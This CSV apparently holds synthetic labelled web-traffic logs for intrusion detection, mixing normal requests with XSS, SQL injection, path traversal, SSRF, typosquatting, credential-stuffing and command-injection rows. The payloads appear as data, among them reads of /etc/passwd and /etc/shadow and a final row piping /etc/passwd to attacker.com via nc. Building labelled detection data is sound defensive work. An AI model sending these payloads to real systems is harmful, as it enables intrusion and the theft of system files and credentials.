timestamp,source_ip,destination_ip,protocol,http_method,url,request_headers,request_body,response_code,response_size,response_headers,user_agent,payload_raw,attack_type_label,hour,day_of_week,is_weekend,is_attack,parsed_request_headers,parsed_response_headers,Host,User-Agent,Accept,Content-Type,Server
2026-03-20 05:28:58,185.199.108.168,34.120.45.67,https,post,/comment,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",comment=%3Csvg%3E%3Cscript%3Ealert%281%29%3C/script%3E,403,2525,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,<svg><script>alert(1)</script>,xss,5,4,0,1,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",198.51.100.23,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,IIS
2026-03-16 12:30:43,192.168.1.181,198.51.100.23,https,get,https://faceb00k.com/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,403,1335,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,faceb00k.com,typosquatting_url_spoofing,12,0,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Nikto/2.5.0,*/*,text/html,IIS
2026-03-10 22:46:21,172.16.0.172,52.45.123.89,https,get,/about?category=laptop,"{""Host"":""104.18.24.12"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,200,4445,"{""Content-Type"":""text/html"",""Server"":""nginx""}",wget/1.21.2,,normal,22,1,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,wget/1.21.2,*/*,text/html,nginx
2026-03-13 20:37:09,192.168.1.144,52.45.123.89,https,get,/,"{""Host"":""34.120.45.67"",""User-Agent"":""curl/7.81.0"",""Accept"":""*/*""}",,200,598,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",curl/7.81.0,,normal,20,4,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'curl/7.81.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",34.120.45.67,curl/7.81.0,*/*,text/html,Cloudflare
2026-03-20 03:45:09,198.51.100.252,3.12.45.78,https,get,/search?q=<svg><script>alert(1)</script>,"{""Host"":""10.0.0.1"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,200,3305,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nmap Scripting Engine,<svg><script>alert(1)</script>,xss,3,4,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",10.0.0.1,Nmap Scripting Engine,*/*,text/html,IIS
2026-03-11 17:13:34,192.168.1.99,104.18.24.12,http,post,/comment,"{""Host"":""192.168.1.1"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=document.write%28%27%3Cscript%3Ealert%281%29%3C/script%3E%27%29,403,2298,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,document.write('<script>alert(1)</script>'),xss,17,2,0,1,"{'Host': '192.168.1.1', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",192.168.1.1,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-11 03:28:24,185.199.108.146,3.12.45.78,http,get,/fetch?url=http://192.168.1.1:8080/actuator/env,"{""Host"":""52.45.123.89"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,404,4787,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,http://192.168.1.1:8080/actuator/env,ssrf,3,2,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",52.45.123.89,BurpSuite/2023.12,*/*,text/html,IIS
2026-03-06 04:33:20,104.18.24.68,52.45.123.89,https,post,/comment,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",comment=%3Cscri%3Cscript%3Ept%3Ealert%281%29%3C/scri%3C/script%3Ept%3E,302,2828,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,<scri<script>pt>alert(1)</scri</script>pt>,xss,4,4,0,1,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",52.45.123.89,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-03 00:42:31,104.18.24.81,3.12.45.78,http,get,/view?path=%25%32%65%25%32%65%25%32%66etc/passwd,"{""Host"":""104.18.24.12"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,404,1181,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,%2e%2e%2fetc/passwd,directory_traversal,0,1,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,BurpSuite/2023.12,*/*,text/html,IIS
2026-03-13 03:35:32,192.168.1.175,10.0.0.1,http,get,https://micrsoft.com/login?redirect=/dashboard,"{""Host"":""185.199.108.153"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,404,2413,"{""Content-Type"":""text/html"",""Server"":""IIS""}",SQLmap/1.8.4,micrsoft.com,typosquatting_url_spoofing,3,4,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,SQLmap/1.8.4,*/*,text/html,IIS
2026-03-15 05:22:58,192.168.1.110,104.18.24.12,http,get,/search?q=' and sleep(5)--,"{""Host"":""185.199.108.153"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,404,813,"{""Content-Type"":""text/html"",""Server"":""IIS""}",BurpSuite/2023.12,' and sleep(5)--,sql_injection,5,6,1,1,"{'Host': '185.199.108.153', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,BurpSuite/2023.12,*/*,text/html,IIS
2026-03-05 04:05:12,172.16.0.38,172.67.128.45,https,get,/ping?ip=127.0.0.1--file=/etc/passwd,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,200,611,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,--file=/etc/passwd,command_injection,4,3,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-11 06:15:27,185.199.108.103,203.0.113.45,http,post,/home,"{""Host"":""52.45.123.89"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",search_query=laptops,200,1100,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,6,2,0,0,"{'Host': '52.45.123.89', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",52.45.123.89,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Cloudflare
2026-03-16 14:20:58,192.168.1.171,192.168.1.1,http,get,/search?q=javascript:alert('dom xss'),"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,401,3865,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,javascript:alert('dom xss'),xss,14,0,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-12 23:43:29,198.51.100.218,52.45.123.89,https,post,/js/script.js,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",search_query=laptops,200,4950,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,23,3,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",172.67.128.45,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Apache
2026-03-10 19:50:38,10.0.0.127,172.67.128.45,http,post,/login,"{""Host"":""34.120.45.67"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",username=user&password=password123,403,5840,"{""Content-Type"":""text/html"",""Server"":""nginx""}",XSStrike/3.1.5,username=user&password=password123,credential_stuffing_brute_force,19,1,0,1,"{'Host': '34.120.45.67', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",34.120.45.67,XSStrike/3.1.5,*/*,text/html,nginx
2026-03-03 15:22:34,172.16.0.226,172.67.128.45,https,get,/download?file=/proc/self/environ,"{""Host"":""3.12.45.78"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,401,5162,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nikto/2.5.0,/proc/self/environ,directory_traversal,15,1,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,Nikto/2.5.0,*/*,text/html,Apache
2026-03-03 23:09:49,185.199.108.115,34.120.45.67,http,post,/login,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",username=john&password=Summer2023,302,2254,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,username=john&password=summer2023,credential_stuffing_brute_force,23,1,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-02 03:21:16,172.67.128.232,34.120.45.67,https,post,/products?limit=admin,"{""Host"":""34.120.45.67"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",email=user@example.com&subscribe=true,200,4283,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,3,0,0,0,"{'Host': '34.120.45.67', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",34.120.45.67,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Apache
2026-03-12 15:34:18,192.168.1.12,10.0.0.1,https,post,/login,"{""Host"":""172.67.128.45"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",email=user58@example.com&password=123456,404,7247,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,email=user58@example.com&password=123456,credential_stuffing_brute_force,15,3,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Nikto/2.5.0,*/*,text/html,nginx
2026-03-14 11:44:39,104.18.24.176,185.199.108.153,http,get,/view?path=/etc/shadow,"{""Host"":""203.0.113.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,7024,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,/etc/shadow,directory_traversal,11,5,1,1,"{'Host': '203.0.113.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-24 08:56:27,185.199.108.108,34.120.45.67,https,get,/settings,"{""Host"":""104.18.24.12"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,200,2293,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,,normal,8,1,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",104.18.24.12,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,Cloudflare
2026-03-21 15:02:58,203.0.113.65,198.51.100.23,https,get,https://micrsoft.com/login?redirect=/dashboard,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0"",""Accept"":""*/*""}",,401,4315,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,micrsoft.com,typosquatting_url_spoofing,15,5,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Firefox/120.0,*/*,text/html,nginx
2026-03-14 19:14:24,192.168.1.136,3.12.45.78,http,get,"/search?q=' and if(1=1, benchmark(1000000,md5(1)), 0)--","{""Host"":""203.0.113.45"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",,200,3049,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nikto/2.5.0,"' and if(1=1, benchmark(1000000,md5(1)), 0)--",sql_injection,19,5,1,1,"{'Host': '203.0.113.45', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",203.0.113.45,Nikto/2.5.0,*/*,text/html,nginx
2026-03-15 20:50:41,10.0.0.9,192.168.1.1,http,get,https://amazon-order-confirmation.net/login?redirect=/dashboard,"{""Host"":""172.67.128.45"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",,500,2192,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,amazon-order-confirmation.net,typosquatting_url_spoofing,20,6,1,1,"{'Host': '172.67.128.45', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-21 13:13:49,10.0.0.174,52.45.123.89,http,post,/login,"{""Host"":""3.12.45.78"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",email=test30@test.com&password=admin123,500,3144,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,email=test30@test.com&password=admin123,credential_stuffing_brute_force,13,5,1,1,"{'Host': '3.12.45.78', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Apache
2026-03-02 23:06:23,172.16.0.177,185.199.108.153,http,get,/settings?category=2,"{""Host"":""104.18.24.12"",""User-Agent"":""wget/1.21.2"",""Accept"":""*/*""}",,200,3297,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",wget/1.21.2,,normal,23,0,0,0,"{'Host': '104.18.24.12', 'User-Agent': 'wget/1.21.2', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",104.18.24.12,wget/1.21.2,*/*,text/html,Cloudflare
2026-03-19 21:03:32,172.67.128.104,34.120.45.67,http,post,/login,"{""Host"":""172.67.128.45"",""User-Agent"":""SQLmap/1.8.4"",""Accept"":""*/*""}",username=john&password=Summer2023,401,5395,"{""Content-Type"":""text/html"",""Server"":""nginx""}",SQLmap/1.8.4,username=john&password=summer2023,credential_stuffing_brute_force,21,3,0,1,"{'Host': '172.67.128.45', 'User-Agent': 'SQLmap/1.8.4', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",172.67.128.45,SQLmap/1.8.4,*/*,text/html,nginx
2026-03-16 01:56:55,203.0.113.37,52.45.123.89,http,get,/ping?ip=127.0.0.1| ping -n 10 127.0.0.1,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,404,529,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,| ping -n 10 127.0.0.1,command_injection,1,0,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",185.199.108.153,Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36,*/*,text/html,nginx
2026-03-23 12:04:30,192.168.1.83,3.12.45.78,http,post,/comment,"{""Host"":""3.12.45.78"",""User-Agent"":""XSStrike/3.1.5"",""Accept"":""*/*""}",comment=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,404,4570,"{""Content-Type"":""text/html"",""Server"":""Apache""}",XSStrike/3.1.5,<iframe src='javascript:alert(1)'>,xss,12,0,0,1,"{'Host': '3.12.45.78', 'User-Agent': 'XSStrike/3.1.5', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",3.12.45.78,XSStrike/3.1.5,*/*,text/html,Apache
2026-03-19 11:20:46,172.16.0.56,34.120.45.67,https,post,/login,"{""Host"":""104.18.24.12"",""User-Agent"":""Nikto/2.5.0"",""Accept"":""*/*""}",login=alice&pass=123456,403,7221,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Nikto/2.5.0,login=alice&pass=123456,credential_stuffing_brute_force,11,3,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Nikto/2.5.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",104.18.24.12,Nikto/2.5.0,*/*,text/html,IIS
2026-03-20 13:08:21,203.0.113.130,203.0.113.45,https,post,/login,"{""Host"":""104.18.24.12"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",user=admin&pwd=password,401,7954,"{""Content-Type"":""text/html"",""Server"":""nginx""}",Nmap Scripting Engine,user=admin&pwd=password,credential_stuffing_brute_force,13,4,0,1,"{'Host': '104.18.24.12', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'nginx'}",104.18.24.12,Nmap Scripting Engine,*/*,text/html,nginx
2026-03-16 05:12:52,10.0.0.51,172.67.128.45,http,get,/ping?ip=127.0.0.1&& ls -la,"{""Host"":""10.0.0.1"",""User-Agent"":""Nmap Scripting Engine"",""Accept"":""*/*""}",,403,1851,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Nmap Scripting Engine,&& ls -la,command_injection,5,0,0,1,"{'Host': '10.0.0.1', 'User-Agent': 'Nmap Scripting Engine', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",10.0.0.1,Nmap Scripting Engine,*/*,text/html,Apache
2026-03-03 00:59:57,10.0.0.93,192.168.1.1,http,post,/api/v1/products,"{""Host"":""172.67.128.45"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",username=john_doe&password=pass123,200,3727,"{""Content-Type"":""text/html"",""Server"":""Cloudflare""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,,normal,0,1,0,0,"{'Host': '172.67.128.45', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Cloudflare'}",172.67.128.45,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,Cloudflare
2026-03-07 16:20:13,192.168.1.103,3.12.45.78,https,get,/products?id=1,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"",""Accept"":""*/*""}",,200,795,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),,normal,16,5,1,0,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",185.199.108.153,Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html),*/*,text/html,Apache
2026-03-23 05:23:18,104.18.24.141,10.0.0.1,http,get,/login?user=' or 1=1--,"{""Host"":""185.199.108.153"",""User-Agent"":""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36"",""Accept"":""*/*""}",,500,2885,"{""Content-Type"":""text/html"",""Server"":""IIS""}",Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,' or 1=1--,sql_injection,5,0,0,1,"{'Host': '185.199.108.153', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'IIS'}",185.199.108.153,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.36,*/*,text/html,IIS
2026-03-11 22:16:15,172.67.128.196,52.45.123.89,http,get,/search?sort=1,"{""Host"":""198.51.100.23"",""User-Agent"":""Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0"",""Accept"":""*/*""}",,200,4359,"{""Content-Type"":""text/html"",""Server"":""Apache""}",Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,,normal,22,2,0,0,"{'Host': '198.51.100.23', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",198.51.100.23,Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0,*/*,text/html,Apache
2026-03-12 04:43:39,104.18.24.20,203.0.113.45,https,get,/ping?ip=127.0.0.1; cat /etc/passwd | nc attacker.com 4444,"{""Host"":""203.0.113.45"",""User-Agent"":""BurpSuite/2023.12"",""Accept"":""*/*""}",,302,3539,"{""Content-Type"":""text/html"",""Server"":""Apache""}",BurpSuite/2023.12,; cat /etc/passwd | nc attacker.com 4444,command_injection,4,3,0,1,"{'Host': '203.0.113.45', 'User-Agent': 'BurpSuite/2023.12', 'Accept': '*/*'}","{'Content-Type': 'text/html', 'Server': 'Apache'}",203.0.113.45,BurpSuite/2023.12,*/*,text/html,Apache
